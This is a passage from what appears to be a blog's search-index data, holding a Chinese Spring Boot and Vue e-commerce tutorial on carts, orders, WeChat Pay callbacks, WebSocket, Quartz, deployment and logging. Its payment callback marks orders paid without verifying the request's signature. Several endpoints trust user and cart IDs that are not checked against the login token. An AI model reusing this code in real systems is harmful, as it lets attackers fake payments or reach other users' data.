src=\"js/vue.js\"&gt;&lt;/script&gt; &lt;!-- 引入组件库 --&gt; &lt;script src=\"https://unpkg.com/element-ui/lib/index.js\"&gt;&lt;/script&gt; 引用分页组件 &lt;!--分页 --&gt; &lt;el-pagination background layout=\"prev, pager, next\" :current-page=\"pageNum\" :page-size=\"limit\" :total=\"count\" @current-change=\"pager\"&gt; &lt;/el-pagination&gt; 监听分页组件的页码改变事件（点击上一页、下一页、页码都会导致页码改变） 分页组件的事件函数默认传递当前页码参数 pager:function(currentPage){ this.pageNum = currentPage; //请求下一页数据 var url3 = baseUrl+\"product/detail-commonts/\"+this.productId; axios.get(url3,{ params:{ pageNum:this.pageNum, limit:this.limit } }).then((res)=&gt;{ //获取到评论分页数据 var pageHelper = res.data.data; //当前页的评论列表 this.productCommonts = pageHelper.list; //总页数 this.pageCount = pageHelper.pageCount; //总记录数 this.count = pageHelper.count; }); } 15.3.2 商品评价统计十六、购物车—添加购物车（登陆状态）16.1 流程分析 16.2 接口实现16.2.1 修改购物车数据表结构 shopping_cart 数据表修改完成之后，对此表重新进行逆向工程 16.2.2 数据库实现 单表添加操作，可以直接使用tkMapper完成 16.2.3 业务层实现 ShoppingCartService接口 public interface ShoppingCartService { public ResultVO addShoppingCart(ShoppingCart cart); } 实现类 16.3 前端实现16.3.1 记录选择的套餐属性 在vue的data中定义 chooseSkuProps 为sku的属性添加点击事件 在methods中定义事件函数changeProp 添加套餐切换的监听事件： 16.3.2 套餐属性选中效果 在套餐属性标签上添加name属性 在属性的点击事件函数实现选中效果 16.3.3 修改商品数量 在vue的data中定义num存储商品数量（默认值为1） 为+，-添加点击事件监听 定义点击事件函数 16.3.4 提交购物车 十七、购物车—添加购物车（未登录状态）17.1 流程分析 17.2 功能实现17.2.1 定义新的状态码 ResStatus 登录认证拦截器 17.2.2 在详情页面判断如果用户未登录，则跳转到登录页面 introduction.html 17.2.3 登录页面接收回跳信息 login.html 17.2.4 回到详情页时接收参数 introduction.html 17.2.5 使用layui添加购物车成功/失败进行提示 引入layui layui.com &lt;!-- 引入 layui.css --&gt; &lt;link rel=\"stylesheet\" href=\"//unpkg.com/layui@2.6.5/dist/css/layui.css\"&gt; &lt;!-- 引入 layui.js --&gt; &lt;script src=\"//unpkg.com/layui@2.6.5/dist/layui.js\"&gt; 声明弹窗组件 当添加购物车成功或者失败的时候，进行提示： 十八、购物车—购物车列表18.1 流程分析 18.2 接口实现18.2.1 数据库实现 SQL -- 根据用户ID查询当前用户的购物车信息 select c.*, p.product_name,i.url from shopping_cart c INNER JOIN product p INNER JOIN product_img i ON c.product_id = p.product_id and i.item_id=p.product_id where user_id=6 and i.is_main=1; 实体类 在Mapper接口定义查询方法 @Repository public interface ShoppingCartMapper extends GeneralDAO&lt;ShoppingCart&gt; { public List&lt;ShoppingCartVO&gt; selectShopcartByUserId(int userId); } 映射配置 18.2.2 业务层实现 Service接口 Service实现类 18.2.3 控制层实现18.3 前端实现18.3.1 显示购物车列表18.3.2 显示购物车中商品价格十九、购物车-修改购物车数量19.1 流程分析19.2 接口实现 在Mapper接口定义修改方法 @Repository public interface ShoppingCartMapper extends GeneralDAO&lt;ShoppingCart&gt; { public List&lt;ShoppingCartVO&gt; selectShopcartByUserId(int userId); public int updateCartnumByCartid(@Param(\"cartId\") int cartId, @Param(\"cartNum\") int cartNum); } 映射配置 &lt;update id=\"updateCartnumByCartid\"&gt; update shopping_cart set cart_num=#{cartNum} where cart_id=#{cartId} &lt;/update&gt; Service接口 public interface ShoppingCartService { public ResultVO addShoppingCart(ShoppingCart cart); public ResultVO listShoppingCartsByUserId(int userId); public ResultVO updateCartNum(int cartId,int cartNum); } Service实现类 @Service public class ShoppingCartServiceImpl implements ShoppingCartService { @Autowired private ShoppingCartMapper shoppingCartMapper; private SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd hh:mm:ss\"); @Override public ResultVO updateCartNum(int cartId, int cartNum) { int i = shoppingCartMapper.updateCartnumByCartid(cartId, cartNum); if(i&gt;0){ return new ResultVO(ResStatus.OK,\"update success\",null); }else{ return new ResultVO(ResStatus.NO,\"update fail\",null); } } } 控制层实现 @PutMapping(\"/update/{cid}/{cnum}\") public ResultVO updateNum(@PathVariable(\"cid\") Integer cartId, @PathVariable(\"cnum\") Integer cartNum, @RequestHeader(\"token\") String token){ ResultVO resultVO = shoppingCartService.updateCartNum(cartId, cartNum); return resultVO; } 19.3 前端实现 为按钮添加点击事件 定义changeNum事件函数 二十、购物车—结算、提交订单 在购物车列表中选择对应的的商品之后，点击提交生成订单的过程 20.1 流程图 20.2 接口实现20.2.1 收货地址列表接口 此操作的数据库实现可以通过tkmapper通用方法完成 service接口UserAddrService public interface UserAddrService { public ResultVO listAddrsByUid(int userId); } Service实现类 UserAddrServiceImpl @Service public class UserAddrServiceImpl implements UserAddrService { @Autowired private UserAddrMapper userAddrMapper; @Transactional(propagation = Propagation.SUPPORTS) public ResultVO listAddrsByUid(int userId) { Example example = new Example(UserAddr.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(\"userId\",userId); criteria.andEqualTo(\"status\",1); List&lt;UserAddr&gt; userAddrs = userAddrMapper.selectByExample(example); ResultVO resultVO = new ResultVO(ResStatus.OK, \"success\", userAddrs); return resultVO; } } 控制器实现 @RestController @CrossOrigin @Api(value = \"提供收货地址相关接口\",tags = \"收货地址管理\") @RequestMapping(\"/useraddr\") public class UserAddrController { @Autowired private UserAddrService userAddrService; @GetMapping(\"/list\") @ApiImplicitParam(dataType = \"int\",name = \"userId\", value = \"用户ID\",required = true) public ResultVO listAddr(Integer userId, @RequestHeader(\"token\") String token){ ResultVO resultVO = userAddrService.listAddrsByUid(userId); return resultVO; } } 20.2.2 购物车记录列表接口 根据一个ID的集合，查询购物车记录，实现方式有两种： 动态sql &lt;select id=\"searchShoppingCartById\" resultMap=\"shopCartMap\"&gt; select * from shopping_cart where cart_id in &lt;foreach collection=\"list\" item=\"cid\" separator=\",\" open=\"(\" close=\")\"&gt; #{cid} &lt;/foreach&gt; &lt;/select&gt; tkMapper条件查询 criteria.andIn(“cartId”,ids); Mapper接口定义查询方法 映射配置(动态sql foreach) Service接口 Service实现类 控制器实现 @GetMapping(\"/listbycids\") @ApiImplicitParam(dataType = \"String\",name = \"cids\", value = \"选择的购物车记录id\",required = true) public ResultVO listByCids(String cids, @RequestHeader(\"token\")String token){ ResultVO resultVO = shoppingCartService.listShoppingCartsByCids(cids); return resultVO; } 20.2.3 保存订单20.3 前端实现20.3.1 选择购物车记录价格联动 列表前的复选框标签 渲染商品数量以及总价格 在vue示例的data中声明opts和totalPrice，并且监听opts选项的改变—选项一旦改变就计算总价格 20.3.2 点击“结算”跳转到订单添加页面 在购物车列表页面，选择购物车记录，点击“结算之后”将选择的购物车记录ID传递到order-add.html shopcart.html order-add.html 20.3.3 显示收货地址及订单商品20.3.4 订单确认页面选择地址二十一、订单提交及支付21.1 流程分析 21.2 订单添加接口实现21.2.1 数据库操作 根据收货地址ID，获取收货地址信息（tkMapper）：收货人姓名、电话、地址也可以从前端传递过来 根据购物车ID，查询购物车详情（需要关联查询商品名称、sku名称、库存、商品图片、商品价格） 改造：ShoppingCartMapper中的selectShopcartByCids 保存订单（tkMapper） 修改库存（tkMapper） 保存商品快照（tkMapper） 21.2.2 业务层实现@Service public class OrderServiceImpl implements OrderService { @Autowired private ShoppingCartMapper shoppingCartMapper; @Autowired private OrdersMapper ordersMapper; @Autowired private OrderItemMapper orderItemMapper; @Autowired private ProductSkuMapper productSkuMapper; /** * 保存订单业务 */ @Transactional public Map&lt;String,String&gt; addOrder(String cids,Orders order) throws SQLException { Map&lt;String,String&gt; map = new HashMap&lt;&gt;(); //1.校验库存：根据cids查询当前订单中关联的购物车记录详情（包括库存） String[] arr = cids.split(\",\"); List&lt;Integer&gt; cidsList = new ArrayList&lt;&gt;(); for (int i = 0; i &lt;arr.length ; i++) { cidsList.add(Integer.parseInt(arr[i])); } List&lt;ShoppingCartVO&gt; list = shoppingCartMapper.selectShopcartByCids(cidsList); boolean f = true; String untitled = \"\"; for (ShoppingCartVO sc: list) { if(Integer.parseInt(sc.getCartNum()) &gt; sc.getSkuStock()){ f = false; } //获取所有商品名称，以,分割拼接成字符串 untitled = untitled+sc.getProductName()+\",\"; } if(f){ //2.保存订单 order.setUntitled(untitled); order.setCreateTime(new Date()); order.setStatus(\"1\"); //生成订单编号 String orderId = UUID.randomUUID().toString().replace(\"-\", \"\"); order.setOrderId(orderId); int i = ordersMapper.insert(order); //3.生成商品快照 for (ShoppingCartVO sc: list) { int cnum = Integer.parseInt(sc.getCartNum()); String itemId = System.currentTimeMillis()+\"\"+ (new Random().nextInt(89999)+10000); OrderItem orderItem = new OrderItem(itemId, orderId, sc.getProductId(), sc.getProductName(), sc.getProductImg(), sc.getSkuId(), sc.getSkuName(), new BigDecimal(sc.getSellPrice()), cnum, new BigDecimal(sc.getSellPrice() * cnum), new Date(), new Date(), 0); orderItemMapper.insert(orderItem); } //4.扣减库存：根据套餐ID修改套餐库存量 for (ShoppingCartVO sc: list) { String skuId = sc.getSkuId(); int newStock = sc.getSkuStock()- Integer.parseInt(sc.getCartNum()); ProductSku productSku = new ProductSku(); productSku.setSkuId(skuId); productSku.setStock(newStock); productSkuMapper.updateByPrimaryKeySelective(productSku); } //5.删除购物车：当购物车中的记录购买成功之后，购物车中对应做删除操作 for (int cid: cidsList) { shoppingCartMapper.deleteByPrimaryKey(cid); } map.put(\"orderId\",orderId); map.put(\"productNames\",untitled); return map; }else{ //表示库存不足 return null; } } } 21.2.3 订单添加接口实现 订单保存 申请支付链接 @PostMapping(\"/add\") public ResultVO add(String cids, @RequestBody Orders order){ ResultVO resultVO = null; try { Map&lt;String, String&gt; orderInfo = orderService.addOrder(cids, order); String orderId = orderInfo.get(\"orderId\"); if(orderId!=null){ //设置当前订单信息 HashMap&lt;String,String&gt; data = new HashMap&lt;&gt;(); data.put(\"body\",orderInfo.get(\"productNames\")); //商品描述 data.put(\"out_trade_no\",orderId); //使用当前用户订单的编号作为当前支付交易的交易号 data.put(\"fee_type\",\"CNY\"); //支付币种 data.put(\"total_fee\",order.getActualAmount()*100+\"\"); //支付金额 data.put(\"trade_type\",\"NATIVE\"); //交易类型 data.put(\"notify_url\",\"/pay/success\"); //设置支付完成时的回调方法接口 //发送请求，获取响应 //微信支付：申请支付连接 WXPay wxPay = new WXPay(new MyPayConfig()); Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); orderInfo.put(\"payUrl\",resp.get(\"code_url\")); resultVO = new ResultVO(ResStatus.OK,\"提交订单成功！\",orderInfo); }else{ resultVO = new ResultVO(ResStatus.NO,\"提交订单失败！\",null); } } catch (SQLException e) { resultVO = new ResultVO(ResStatus.NO,\"提交订单失败！\",null); } catch (Exception e) { e.printStackTrace(); } return resultVO; } 21.3 前端提交订单信息 点击“提交订单”按钮，触发doSubmit order-add.html 21.4 支付回调 支付回调：当用户支付成功之后，支付平台会向我们指定的服务器接口发送请求传递订单支付状态数据 2.4.1 创建一个控制器定义回调接口@RestController @RequestMapping(\"/pay\") public class PayController { @Autowired private OrderService orderService; /** * 回调接口:当用户支付成功之后，微信支付平台就会请求这个接口，将支付状态的数据传递过来 * */ @RequestMapping(\"/callback\") public String paySuccess(HttpServletRequest request) throws Exception { System.out.println(\"--------------------callback\"); // 1.接收微信支付平台传递的数据（使用request的输入流接收） ServletInputStream is = request.getInputStream(); byte[] bs = new byte[1024]; int len = -1; StringBuilder builder = new StringBuilder(); while((len = is.read(bs))!=-1){ builder.append(new String(bs,0,len)); } String s = builder.toString(); //使用帮助类将xml接口的字符串装换成map Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(s); if(map!=null &amp;&amp; \"success\".equalsIgnoreCase(map.get(\"result_code\"))){ //支付成功 //2.修改订单状态为“待发货/已支付” String orderId = map.get(\"out_trade_no\"); int i = orderService.updateOrderStatus(orderId, \"2\"); System.out.println(\"--orderId:\"+orderId); //3.响应微信支付平台 if(i&gt;0){ HashMap&lt;String,String&gt; resp = new HashMap&lt;&gt;(); resp.put(\"return_code\",\"success\"); resp.put(\"return_msg\",\"OK\"); resp.put(\"appid\",map.get(\"appid\")); resp.put(\"result_code\",\"success\"); return WXPayUtil.mapToXml(resp); } } return null; } } 2.4.2 设置回调URL 在订单接口中申请支付连接的时候将回调接口的路径设置给微信支付平台 OrderController 思考：如果按照上图所示的配置，当用户支付成功之后，微信支付平台会向（http://192.168.55.3:8080/pay/callback）发送请求，因为我们的服务端项目是运行在本地计算机的（IP为内网IP），微信平台没办法访问 —— 内网穿透 21.5 Ngrok实现内网穿透21.5.1 注册帐号，申请隧道ID 注册 www.ngrok.cc 开通隧道 获取隧道ID：118c7bfe1ac90369 21.5.2 下载ngrok客户端 https://ngrok.cc/download.html 21.5.3 启动客户端 访问http://ytao.free.idcfengye.com就相当于访问本地的8080 21.6 前端通过轮询访问获取订单支付状态 流程图 接口实现 前端轮询访问接口 21.7 webSocket消息推送21.7.1 实现流程 21.7.2 创建webSocket服务器 添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-websocket&lt;/artifactId&gt; &lt;/dependency&gt; 添加websocket服务节点配置（Java配置方式） @Configuration public class WebSocketConfig { @Bean public ServerEndpointExporter getServerEndpointExporter(){ return new ServerEndpointExporter(); } } 创建websocket服务器 @Component @ServerEndpoint(\"/webSocket/{oid}\") public class WebSocketServer { private static ConcurrentHashMap&lt;String,Session&gt; sessionMap = new ConcurrentHashMap&lt;&gt;(); /**前端发送请求建立websocket连接，就会执行@OnOpen方法**/ @OnOpen public void open(@PathParam(\"oid\") String orderId, Session session){ sessionMap.put(orderId,session); } /**前端关闭页面或者主动关闭websocket连接，都会执行close**/ @OnClose public void close(@PathParam(\"oid\") String orderId){ sessionMap.remove(orderId); } public static void sendMsg(String orderId,String msg){ try { Session session = sessionMap.get(orderId); session.getBasicRemote().sendText(msg); }catch (Exception e){ e.printStackTrace(); } } } 21.7.3 在支付回调接口，通过订单id获取session返回结果@RestController @RequestMapping(\"/pay\") public class PayController { @Autowired private OrderService orderService; /** * 回调接口:当用户支付成功之后，微信支付平台就会请求这个接口，将支付状态的数据传递过来 */ @RequestMapping(\"/callback\") public String paySuccess(HttpServletRequest request) throws Exception { System.out.println(\"--------------------callback\"); // 1.接收微信支付平台传递的数据（使用request的输入流接收） ServletInputStream is = request.getInputStream(); byte[] bs = new byte[1024]; int len = -1; StringBuilder builder = new StringBuilder(); while((len = is.read(bs))!=-1){ builder.append(new String(bs,0,len)); } String s = builder.toString(); //使用帮助类将xml接口的字符串装换成map Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(s); if(map!=null &amp;&amp; \"success\".equalsIgnoreCase(map.get(\"result_code\"))){ //支付成功 //2.修改订单状态为“待发货/已支付” String orderId = map.get(\"out_trade_no\"); int i = orderService.updateOrderStatus(orderId, \"2\"); System.out.println(\"--orderId:\"+orderId); //3.通过websocket连接，向前端推送消息 WebSocketServer.sendMsg(orderId,\"1\"); //4.响应微信支付平台 if(i&gt;0){ HashMap&lt;String,String&gt; resp = new HashMap&lt;&gt;(); resp.put(\"return_code\",\"success\"); resp.put(\"return_msg\",\"OK\"); resp.put(\"appid\",map.get(\"appid\")); resp.put(\"result_code\",\"success\"); return WXPayUtil.mapToXml(resp); } } return null; } } 21.7.4 前端进入到支付页面时，就建立websocket连接//前端发送websocket连接请求 var webSocketUrl = webSocketBaseUrl + \"webSocket/\"+ this.orderInfo.orderId; var websocket = new WebSocket( webSocketUrl ); //只要后端通过websocket向此连接发消息就会触发onmessage事件 websocket.onmessage = function(event){ var msg = event.data; if(msg==\"1\"){ $(\"#div1\").html(\"&lt;label style='font-size:20px; color:green'&gt;订单支付完成！&lt;/label&gt;\"); } } 二十二、订单超时取消 订单超时取消，指的是当用户成功提交订单之后在规定时间内没有完成支付，则将订单关闭还原库存。 实现订单的超时取消业务通常有两种解决方案： 定时任务（quartz） 延时队列（MQ） 22.1 实现流程 22.2 quartz定时任务框架使用22.2.1 添加依赖&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-quartz&lt;/artifactId&gt; &lt;/dependency&gt; 22.2.2 创建定时任务 定时任务，每隔指定的时间就执行一次任务 案例：每隔3s就打印一次Helloworld @Component public class PrintHelloWorldJob { //https://cron.qqe2.com @Scheduled(cron = \"0/3 * * * * ?\") public void printHelloWorld(){ System.out.println(\"----hello world.\"); } } 22.2.3 在启动类开启定时任务@SpringBootApplication @EnableScheduling public class QuartzDemoApplication { public static void main(String[] args) { SpringApplication.run(QuartzDemoApplication.class, args); } } 22.3 实现订单超时取消22.3.1 在service子工程添加spring-boot-starter-quartz依赖22.3.2 在api自动启动类添加@EnableScheduling注解二十三、按类别查询商品23.1 流程分析 23.2 接口开发23.2.1 根据类别查询商品接口 数据库分析及SQL 数据库实现 实体类 ProductMapper接口 ProductSkuMapper 业务层实现 控制层实现 23.2.2 根据类别ID查询当前类别下所有商品的品牌 SQL -- 查询统计某个类别下所有商品的品牌：SQL select DISTINCT brand from product_params where product_id in (select product_id from product where category_id=49) 数据库实现 ProductMapper接口 映射配置 Service实现 Controller实现 23.3 前端实现二十四、商品搜索24.1 流程分析 24.2 接口实现24.2.1 模糊查询商品信息 数据库实现 ProductMapper 映射配置 Service实现 ProductServiceImpl Controller实现 24.2.2 根据关键字查询对应商品的品牌 SQL -- 根据关键字查询对应商品的品牌名称 select DISTINCT brand from product_params where product_id in (select product_id from product where product_name like '%小%') 数据库实现 ProductMapper 映射配置 Service实现 ProductServiceImpl Controller实现 24.3 前端实现二十五、用户中心25.1 用户中心登录校验25.1.1 校验token接口实现 UserController @ApiOperation(\"校验token是否过期接口\") @GetMapping(\"/check\") public ResultVO userTokencheck(@RequestHeader(\"token\") String token){ return new ResultVO(ResStatus.OK,\"success\",null); } token校验拦截器配置 @Configuration public class InterceptorConfig implements WebMvcConfigurer { @Autowired private CheckTokenInterceptor checkTokenInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(checkTokenInterceptor) .addPathPatterns(\"/shopcart/**\") .addPathPatterns(\"/orders/**\") .addPathPatterns(\"/useraddr/**\") .addPathPatterns(\"/user/check\"); //将接口配置到token校验拦截器 } } 25.1.2 前端用户中心首页校验token&lt;script type=\"text/javascript\"&gt; var baseUrl = \"http://localhost:8080/\" var vm = new Vue({ el:\"#div1\", data:{ token:\"\", username:\"\", userImg:\"\" }, created:function(){ //从cookie中获取用户信息（token、用户id、用户名、头像） this.token = getCookieValue(\"token\"); if(this.token == null){ window.location.href = \"login.html?returnUrl=user-center.html\"; }else{ //如果登录过期需要重新登录，创建一个校验用户登录的接口，通过请求这个接口进行token的检验 //请求user/check接口 var url1 = baseUrl+\"user/check\"; axios({ url:url1, method:\"get\", headers:{ token:this.token } }).then((res)=&gt;{ if(res.data.code == 10000){ //token校验通过 this.username = getCookieValue(\"username\"); this.userImg = getCookieValue(\"userImg\"); }else{ window.location.href = \"login.html?returnUrl=user-center.html\"; } }); } } }); &lt;/script&gt; 25.2 用户中心的订单管理25.2.1 流程分析25.2.2 接口实现 数据库实现 根据用户的ID分页查询当前用户的订单信息、关联查询订单中的商品快照 根据用户的ID和订单状态分页查询当前用户的订单信息、关联查询订单中的商品快照 封装OrdersVO OrderMapper 映射配置 Service实现 OrderServiceImpl 控制器实现 25.2.3 前端实现https://www.processon.com/view/link/606bde8b1e08534321fd2103 二十六、项目云部署26.1 项目部署介绍 项目部署就是将开发—测试完成的项目运行在生产环境中 多种的部署环境是为了实现数据的隔离、对数据进行保护 开发环境：windows （有非常便利的可视化操作系统） 生产环境：Linux （开源免费、系统开销小、安全性高） 开发环境（windows） 应用服务器 Tomcat-windows 数据库服务器 MySQL-Linux/windows 测试环境（模拟的生产环境） 应用服务器 Tomcat-Linux 数据库服务器 Tomcat-Linux 生产环境（需要进行保护的、不能被破坏的） 应用服务器 Tomcat-Linux 数据库服务器 Tomcat-Linux 26.2 后端项目部署1.搭建云服务器环境 JDK MySQL 2.maven聚合工程打包 3.上传到云服务器4.启动项目java -jar api-2.0.1.jar &amp; 26.3 前端项目部署（tomcat） 前端项目也需要部署在服务器上，才能够提供多用户访问 tomcat可以作为前端项目部署的服务器使用 安装Tomcat，配置port 为 9999 将前端项目上传到tomcat/webapps中 启动Tomcat 访问：http://47.118.45.73:9999/fmall-static/index.html 使用Tomcat部署前端项目存在的问题： 1.前端项目的一个页面会包含大量的css\\js\\图片，会有大量的并发请求，Tomcat难以满足并发的需求 2.Tomcat的核心价值在于能够便于执行Java程序，而不是处理并发，同时前端项目中没有Java程序，从功能上讲前端项目的部署也用不着Tomcat 结论：使用Tomcat作为部署前端项目的服务器是不合适的。 26.4 前端项目部署（Nginx）在Linux安装Nginx 修改前端项目的baseUrl 将前端项目上传到nginx目录 配置nginx的访问路径 二十七、项目日志管理27.1 日志框架的概念 在项目开发、运维过程中，为了能够清晰的知道项目在服务器中的运行过程、便于查找服务器运行过程的异常原因，我们需要对系统运行过程进行记录 — 运行日志 我们可以使用 控制台输出 的形式进行运行过程记录（不便于日志信息跟踪和维护、不能够持久化存储） 控制台输出日志的诸多弊端 催化了 日志框架的诞生 日志框架 用于帮助我们在应用开发中完成日志记录的帮助类 日志框架作用 1.有结构的记录日志信息（结构是为了提升日志信息的可读性） 2.定义日志的输出策略（每个日志文件最大5m、每天一个日志文件） 27.2 日志框架规范 日志框架规范：日志记录实现的规则 日志框架：实现日志记录 日志接口（日志框架规范） JCL（Jakatra Commons Logging） SLF4J（Simple Logging Facade For Java ） JBoss Logging 日志实现（日志框架） Log4j Logback 27.3 SLF4J SLF4J（Simple Logging Facade For Java ）简单日志门面，定义了一套日志规范，并不是日志框架解决方法。 SLF4J的实现框架 27.4 slf4j-simple 创建springBoot应用 移出springboot应用默认logback-classic的日志依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt; &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; 添加依赖 &lt;!-- https://mvnrepository.com/artifact/org.slf4j/slf4j-simple --&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt; &lt;version&gt;1.7.25&lt;/version&gt; &lt;/dependency&gt; 在service层打印日志 @Service public class TestServiceImpl implements TestService { private Logger logger = LoggerFactory.getLogger(TestServiceImpl.class); @Override public void testLog() { //日志记录 //System.out.println(\"日志信息\"); logger.info(\"订单添加完成\"); } } 27.5 log4j使用介绍 log4j没有实现slf4j,如果基于slf4j规范使用log4j，则需要添加slf4j-log4j12依赖 添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;1.7.25&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; 在resources目录下创建log4j.properties文件 log4j.rootLogger=DEBUG,stdout # MyBatis logging configuration... log4j.logger.org.mybatis.example.BlogMapper=TRACE # Console output... log4j.appender.stdout=org.apache.log4j.ConsoleAppender log4j.appender.stdout.layout=org.apache.log4j.PatternLayout log4j.appender.stdout.layout.ConversionPattern=[%t] %5p - %n%m 27.6 基于SpringBoot应用的logback日志配置 SpringBoot默认整合了logback-classic日志框架，我们需要对logback日志框架进行配置以自定义日志输出格式、日志文件配置、日志文件保存策略等信息 logback配置 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;configuration&gt; &lt;appender name=\"stdout\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt; &lt;encoder&gt; &lt;springProfile name=\"dev\"&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;springProfile name=\"!dev\"&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;!--日志的编码格式--&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--这个就表示的是要把 日志输出到文件(FileAppender)--&gt; &lt;appender name=\"file\" class=\"ch.qos.logback.core.FileAppender\"&gt; &lt;file&gt;D:/log/output.log&lt;/file&gt; &lt;!--设置日志是否追加--&gt; &lt;append&gt;true&lt;/append&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss.SSS} %level [%thread]-%class:%line&gt;&gt;%msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!--设置日志写入是否线程安全--&gt; &lt;prudent&gt;false&lt;/prudent&gt; &lt;/appender&gt; &lt;appender name=\"timeFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt; &lt;!--TimeBasedRollingPolicy 基于时间的滚动策略--&gt; &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt; &lt;fileNamePattern&gt;d:/log/log-%d{yyyy-MM-dd-HH}.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss.SSS} %level [%thread]-%class:%line&gt;&gt;%msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name=\"fixedFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt; &lt;file&gt;d:/log/fixedFile.log&lt;/file&gt; &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.FixedWindowRollingPolicy\"&gt; &lt;fileNamePattern&gt;log/fixedFile%i.log&lt;/fileNamePattern&gt; &lt;minIndex&gt;1&lt;/minIndex&gt; &lt;maxIndex&gt;10&lt;/maxIndex&gt; &lt;/rollingPolicy&gt; &lt;!--SizeBasedTriggeringPolicy--&gt; &lt;triggeringPolicy class=\"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy\"&gt; &lt;maxFileSize&gt;5MB&lt;/maxFileSize&gt; &lt;/triggeringPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss.SSS} %level [%thread]-%class:%line&gt;&gt;%msg%n &lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;root level=\"info\"&gt; &lt;appender-ref ref=\"stdout\" /&gt; &lt;appender-ref ref=\"timeFile\"/&gt; &lt;/root&gt; &lt;/configuration&gt; 27.7 在锋迷商城项目进行日志配置27.7.1 在api子工程的resources目录添加日志配置文件 logback-spring.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;configuration&gt; &lt;appender name=\"stdout\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt; &lt;encoder&gt; &lt;springProfile name=\"dev\"&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;springProfile name=\"!dev\"&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss E} %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;!--日志的编码格式--&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name=\"timeFile\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\"&gt; &lt;!--TimeBasedRollingPolicy 基于时间的滚动策略--&gt; &lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt; &lt;!--日志文件的存储路径--&gt; &lt;fileNamePattern&gt;log/log-%d{yyyy-MM-dd-HH}.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd-HH:mm:ss.SSS} %level [%thread]-%class:%line&gt;&gt;%msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;root level=\"info\"&gt; &lt;appender-ref ref=\"stdout\"/&gt; &lt;appender-ref ref=\"timeFile\"/&gt; &lt;/root&gt; &lt;/configuration&gt; 27.7.2 在sercie实现类创建Logger对象，输入日志","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"Springboot项目","slug":"Springboot项目","permalink":"https://bigbug888.github.io/tags/Springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"博客与博主","slug":"01-博客诞生","date":"2020-05-27T13:00:00.000Z","updated":"2021-11-25T19:25:41.512Z","comments":true,"path":"posts/1.html","link":"","permalink":"https://bigbug888.github.io/posts/1.html","excerpt":"","text":"相遇皆是缘分 为什么建博客？肿么说了! 纯属个人兴趣，好玩，唉，就是玩!嘻嘻! 会有些成就感吧,拥有一个自己的博客写一些自己感兴趣的事或物,不是一件很酷的事嘛! 展望博客我会整理一些个人所学的知识（学前端的，也会捣鼓捣鼓一些其它的专业的知识）或生活方面有兴趣的事发到博客上供大家观摩 